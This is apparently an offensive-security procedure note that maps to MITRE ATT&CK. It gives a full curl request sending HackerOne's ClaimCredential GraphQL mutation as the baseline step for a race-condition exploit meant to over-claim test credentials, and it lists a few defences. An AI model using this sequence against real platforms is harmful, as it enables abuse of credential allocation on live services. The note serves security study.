---
tags:
  - graphql
  - credential-claim
  - web
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/claim-credential-graphql-mutation]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:24:22.933Z'
skill_level: intermediate
impact_level: low
detection_risk: low
sub_techniques: []
id: d84c034b-64a5-42cc-b4e6-c8055ba6dcde
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Send-Initial-GraphQL-Claim-Credential-Mutation

## Summary

This procedure sends a single GraphQL mutation to claim test credentials for a program on a platform like HackerOne, establishing the initial state for race condition exploitation.

## Description

In the context of exploiting a TOCTOU vulnerability, this step initiates the credential claim process via the ClaimCredential mutation on the /graphql endpoint. It requires an authenticated session and a valid team_id (base64-encoded). The mutation fetches up to 100 errors and returns credential details if successful. This serves as the baseline before concurrent attacks.

## Requirements

1. Valid authentication token (X-Auth-Token) for the target platform.
2. Base64-encoded team_id for the private program.
3. Access to curl or a similar HTTP client; Burp Suite for interception.
4. Network connectivity to the GraphQL endpoint (e.g., https://hackerone.com/graphql).

## Defense

Defensive measures and detection strategies:

- Implement rate limiting on GraphQL mutations to prevent rapid requests.
- Use database transactions with proper locking to synchronize credential claims.
- Monitor for unusual patterns in claim requests from single IPs.

## Objectives

1. Claim an initial test credential for the target program.
2. Verify the mutation works without errors.
3. Prepare state for concurrent exploitation.

## Instructions

### Step 1: Prepare and Authenticate

**Context**: Ensure you have a valid session token and team_id from a program invitation.

No command needed; obtain X-Auth-Token from browser cookies or API login.

### Step 2: Execute Claim Mutation

**Context**: Send the GraphQL POST request to claim the credential, using the provided mutation query and variables.

**Command** ([[commands/claim-credential-graphql-mutation]]):

```bash
curl -X POST https://hackerone.com/graphql \
  -H "Content-Type: application/json" \
  -H "X-Auth-Token: YOUR_TOKEN" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -d '{"query":"mutation Claim_credential_mutation($input_0:ClaimCredentialInput!,$types_1:[ErrorTypeEnum]!,$first_2:Int!) {claimCredential(input:$input_0) {clientMutationId,...F4,...F5}} fragment F0 on Team {id,claimed_credential {credentials,account_details,id}} fragment F1 on Node {id} fragment F2 on ResourceInterface {...F0,...F1} fragment F3 on Team {id} fragment F4 on ClaimCredentialPayload {team {id,...F2,...F3}} fragment F5 on ClaimCredentialPayload {team {claimed_credential {id},id},was_successful,_errors4fkckF:errors(types:$types_1,first:$first_2) {edges {node {type,field,message,id},cursor},pageInfo {hasNextPage,hasPreviousPage}}}}","variables":{"input_0":{"team_id":"BASE64_TEAM_ID","clientMutationId":"1"},"types_1":"ARGUMENT","first_2":100}}'
```

> This command sends the mutation with team_id and clientMutationId. Expected output is a JSON response with claimCredential containing was_successful: true and claimed_credential details like credentials (email, password) and account_details.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/claim-credential-graphql-mutation]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- graphql
- mutation
- claim-credential
